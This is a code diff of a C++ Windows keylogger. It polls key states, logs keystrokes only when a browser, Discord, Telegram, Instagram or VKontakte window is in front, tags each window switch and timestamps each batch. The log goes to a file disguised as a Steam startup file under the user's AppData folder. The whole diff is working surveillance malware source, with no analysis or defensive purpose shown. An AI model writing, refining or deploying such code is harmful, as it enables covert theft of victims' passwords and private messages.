@@ -1,16 +1,15 @@
+#define _CRT_SECURE_NO_WARNINGS
 #include "InputHandler.hpp"
 #include <time.h>
 #include "assert.hpp"
-void InputHandler::resetInputArray(bool* array, int size)
-{
-	for (int i = 0; i < size; i++)array[i] = false;
-}
 void InputHandler::printToFile(const char* directory)
 {
+	setlocale(LC_ALL, "Russian");
+	if (temporaryBuffer.empty())return;
+	buffer += temporaryBuffer;
 	if (!directory || buffer.empty())return;
-	setlocale(LC_ALL, "ru");
-	time_t rawtime;
-	time(&rawtime);
+	time_t now = time(0);
+	tm* ltm = localtime(&now);
 	int length = 0;
 	std::ifstream helpForFindingLength(directory, std::ios::ate | std::ios::in);
 	std::ofstream fileOutputHandler;
@@ -22,36 +21,47 @@ void InputHandler::printToFile(const char* directory)
 		ZeroMemory(_buffer, length);
 		fileOutputHandlerReserve.read(_buffer, length);
 		fileOutputHandlerReserve.close();
-
 		fileOutputHandler.open(directory);
 		assert(fileOutputHandler.is_open());
 		for (int i = 0; _buffer[i]; i++)
-		{
-			if (_buffer[i] == VK_MENU)fileOutputHandler << "[ALT]";
-			if (_buffer[i] == VK_BACK)fileOutputHandler << "[BSP]";
-			if (_buffer[i] == VK_RETURN)fileOutputHandler << "[NL]" << std::endl;
-			if (_buffer[i] == 32)fileOutputHandler << "[SP]";
-			if (_buffer[i] == VK_TAB)fileOutputHandler << "[TAB]";
-			if (_buffer[i] == VK_CAPITAL)fileOutputHandler << "[CAPS]";
-			else fileOutputHandler << _buffer[i];
+		{		
+			fileOutputHandler << _buffer[i];
 		}
 		delete[] _buffer;
 	}
 	if(!fileOutputHandler.is_open())fileOutputHandler.open(directory);
-	fileOutputHandler << "[INPUT DATA:]" << rawtime << std::endl;
-	for (int i = 0; buffer[i]; i++)
-	{
-		if (buffer[i] == VK_MENU)fileOutputHandler << "[ALT]";
-		if (buffer[i] == VK_BACK)fileOutputHandler << "[BSP]";
-		if (buffer[i] == VK_RETURN)fileOutputHandler << "[NL]" << std::endl;
-		if (buffer[i] == 32)fileOutputHandler << "[SP]";
-		if (buffer[i] == VK_TAB)fileOutputHandler << "[TAB]";
-		if (buffer[i] == VK_CAPITAL)fileOutputHandler << "[CAPS]";
-		else fileOutputHandler << buffer[i];
-	}
+	fileOutputHandler << "[INPUT DATA:]" << ltm->tm_hour << ":" << ltm->tm_min << std::endl;
+	fileOutputHandler << buffer;
 	fileOutputHandler << std::endl;
 	fileOutputHandler.close();
 	buffer.clear();
+	temporaryBuffer.clear();
+}
+std::pair<int, int> InputHandler::GetTimeHM(int seconds)
+{
+	int hours = seconds / 3600;
+	int minutes = (seconds - hours * 3600) / 60;
+	return { hours, minutes };
+}
+std::optional<std::string> InputHandler::GetForegroundWindowName()
+{
+	static const char* processList[] = { "Google Chrome","Opera","Mozila Firefox", "Discord","Telegram","Instagram","¬контакте" };
+	WCHAR wWindowText[100];
+	std::wstring wWindowTextBuffer;
+	HWND hHwnd = GetForegroundWindow();
+	static HWND hHwndStatic = GetForegroundWindow();
+	GetWindowText(hHwnd, (LPWSTR)&wWindowText, 100);
+	wWindowTextBuffer = std::wstring(wWindowText);
+	std::string sProcName(wWindowTextBuffer.begin(), wWindowTextBuffer.end());
+	std::string ClippedName;
+	for (const char* procName : processList)
+	{
+		if (strstr(sProcName.c_str(), procName)) {
+			ClippedName = procName;
+		}
+	}
+	if (ClippedName.empty())return std::nullopt;
+	return std::optional<std::string>(ClippedName);
 }
 std::string InputHandler::GetDirectoryToFile()
 {
@@ -63,33 +73,33 @@ std::string InputHandler::GetDirectoryToFile()
 	std::string AppDataPath = "C:\\Users\\" + user_name + "\\AppData\\Local\\Steam\\Startup.txt";
 	return AppDataPath;
 }
-void InputHandler::AddToBuffer(char value)
-{
-	setlocale(LC_ALL, "ru");
-	buffer += value;
-}
 void InputHandler::GetPressedChar()
 {
-	static const char* processList[] = { "Google Chrome", "Steam","Opera","Mozila Firefox", "Steam", "Discord","Telegram","Instagram","¬контакте" };
-	WCHAR wWindowText[100];
-	std::wstring wWindowTextBuffer;
-	HWND hHwnd = GetForegroundWindow();
-	GetWindowText(hHwnd, (LPWSTR)&wWindowText, 100);
-	wWindowTextBuffer = std::wstring(wWindowText);
-	std::string sProcName(wWindowTextBuffer.begin(), wWindowTextBuffer.end());
-	bool bBreturn = true;
-	for (const char* procName : processList)
+	setlocale(LC_ALL, "Russian");
+	static std::string oldWindowName;
+	std::optional<std::string> WindowName = GetForegroundWindowName();
+	if (WindowName.has_value() && oldWindowName != WindowName.value())
 	{
-		if (strstr(sProcName.c_str(),procName)) {
-			bBreturn = false;
-		}
+		temporaryBuffer += WindowName.value() + ": \n";
+		oldWindowName = WindowName.value();
 	}
-	if (bBreturn)return;
-	setlocale(LC_ALL, "ru");
+	/*if (!WindowName.has_value() && !oldWindowName.empty())
+	{
+		temporaryBuffer += oldWindowName + ": \n";
+		oldWindowName.clear();
+	}*/
+	if (!WindowName.has_value() || WindowName == std::nullopt)return;
 	for (short i = 8; i <= 190; i++)
 	{
 		if (GetAsyncKeyState(i) & 0x01) {
-			AddToBuffer((char)i);
+			if (i == 8)temporaryBuffer += "[BKS]";
+			else if (i == VK_SHIFT)temporaryBuffer += "[ST]";
+			else if (i == VK_MENU)temporaryBuffer += "[CTRL]";
+			else if (i == VK_RETURN)temporaryBuffer += "[ER]\n";
+			else if (i == 32)temporaryBuffer += "[SC]";
+			else if (i == VK_TAB)temporaryBuffer += "[Tab]";
+			else if (i == VK_CAPITAL)temporaryBuffer += "[Caps]";
+			else temporaryBuffer += (char)i;
 		}
 	}
 }
